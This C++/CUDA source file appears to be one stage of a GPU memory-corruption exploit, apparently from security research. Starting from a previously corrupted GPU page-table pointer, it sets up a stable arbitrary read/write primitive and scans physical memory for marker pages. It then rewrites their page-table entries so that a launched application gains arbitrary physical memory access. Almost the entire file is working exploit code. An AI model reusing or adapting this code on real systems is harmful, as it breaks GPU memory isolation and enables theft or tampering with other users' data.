#include "./s4_secondRegion.cuh"
#include <chrono>
#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sys/mman.h>
#include <thread>
#include <unistd.h>

int
main (int argc, char *argv[])
{
  if (argc <= 1)
    {
      std::cout << "Not enough arguments.\n";
      return 0;
    }
  std::string transfer_app_cmd = argv[argc - 1];
  removeFirstNArgs (argc, argv, 1);
  GPUBreachContext ctx = second_PT_region (argc, argv);

  auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
  auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;

  // Initialize flush primitives and (Incomplete until
  // setup_cudaMalloc_primitive)
  struct ArbRW_Primtv prim;

  // Generate 64KB Pages
  prim.gen_64KB ();

  // Flush TLB
  prim.flush_tlb ();

  // Temporarily use our previous corrupted pointer.
  prim.pt_ptr = corrupted_ptr;

  // Using the 64KB arbitrary RW pointer, converting primitive to cudaMalloc,
  // non-evictable 2MB versions.
  setup_cudaMalloc_primitive (prim, cudaMalloced_ptrs);

  std::cout << "(Stable Primitive Ready) Starting your app now. It should "
               "load the page for doing arbitrary RW with 0x6464646464646464,"
               "and its page for modifying the arbitrary RW location with "
               "0x4646464646464646."
            << '\n';
  std::system (transfer_app_cmd.c_str ());
  std::this_thread::sleep_for (std::chrono::seconds (2));
  std::cout << "Running" << '\n';

  uint64_t it_ptr = NULL_PTE;
  uint64_t memory_limit = get_memory_limit () - 1L * GB;

  // Find the physical location of the 0x6464... and 0x4646 pointers.
  uint64_t transfer_arb_phys = 0, transfer_mod_phys = 0;
  for (uint64_t i = 0; i < memory_limit; i += ALLOC_SIZE)
    {
      prim.modify (it_ptr);
      prim.flush_tlb ();

      cudaMemcpyArray (prim.data_device_ptr, prim.arb_rw_ptr, ALLOC_SIZE);
      uint64_t first_8B = *(uint64_t *)prim.data_device_ptr;
      DBG_OUT << i << ' ' << (void *)it_ptr << ' ' << (void *)first_8B << '\n';
      if (first_8B == 0x6464646464646464)
        {
          transfer_arb_phys = it_ptr;
          std::cout << "Found your page in " << (void *)it_ptr
                    << ", Value: " << (void *)0x6464646464646464 << '\n';
        }
      if (first_8B == 0x4646464646464646)
        {
          transfer_mod_phys = it_ptr;
          std::cout << "Found modifier page in " << (void *)it_ptr
                    << ", Value: " << (void *)0x4646464646464646 << '\n';
        }
      if (transfer_mod_phys != 0 && transfer_arb_phys != 0)
        {
          std::cout << "Found both, looking for their PTEs...\n";
          break;
        }

      it_ptr += 0x20000;
    }

  DBG_OUT << (void *)transfer_mod_phys << ' ' << (void *)transfer_arb_phys
          << '\n';
  if (debug_enabled ())
    paused ();

  // Find the Page Table storing mod and arb pointers and their PTE offsets.
  uint64_t transfer_mod_pt_ofs = 0, transfer_arb_pt_ofs = 0;
  uint64_t transfer_mod_pt_phys = 0, transfer_arb_pt_phys = 0;
  it_ptr = NULL_PTE;
  uint64_t mask = 0x00FFFFFFFFFFFF00ULL;
  for (uint64_t i = 0; i < memory_limit; i += ALLOC_SIZE)
    {
      prim.modify (it_ptr);
      prim.flush_tlb ();

      cudaMemcpyArray (prim.data_device_ptr, prim.arb_rw_ptr, ALLOC_SIZE);
      for (uint64_t z = 0; z < 2L * 1024 * 1024; z += 8)
        {
          uint64_t cur_pte_val
              = ((*(uint64_t *)(prim.data_device_ptr + z)) & mask);
          if (cur_pte_val == (transfer_arb_phys & mask))
            {
              transfer_arb_pt_ofs = z;
              transfer_arb_pt_phys = it_ptr;
              std::cout << "Found arb PTE in " << (void *)transfer_arb_pt_phys
                        << ", at ofs: " << (void *)transfer_arb_pt_ofs << '\n';
            }
          if (cur_pte_val == (transfer_mod_phys & mask))
            {
              transfer_mod_pt_ofs = z;
              transfer_mod_pt_phys = it_ptr;
              std::cout << "Found mod PTE in " << (void *)transfer_mod_pt_phys
                        << ", at ofs: " << (void *)transfer_mod_pt_ofs << '\n';
            }
        }
      if (transfer_mod_pt_phys != 0 && transfer_arb_pt_phys != 0)
        {
          std::cout
              << "Found both, modifying them to their appropriate values...\n";
          break;
        }

      it_ptr += 0x20000;
    }

  // Move arbitrary rw to mod's PT physical location
  prim.modify (transfer_mod_pt_phys);
  prim.flush_tlb ();

  // Set mod's PTE to point to arb's PT location
  prim.modify (prim.arb_rw_ptr, transfer_mod_pt_ofs, transfer_arb_pt_phys);
  prim.flush_tlb ();

  // Now, move arbitrary rw to arb's PT physical location
  prim.modify (transfer_arb_pt_phys);
  prim.flush_tlb ();

  // Modify arb's PTE at offset to PTE null, for the application to know the
  // offset
  prim.modify (prim.arb_rw_ptr, transfer_arb_pt_ofs, 0x0600000000000001);
  prim.flush_tlb ();

  std::cout << "Done. The application is currently running. Check the "
               "'app.out' file in the respective 'data_scripts/' folder for "
               "progress if needed.\n";

  return 0;
}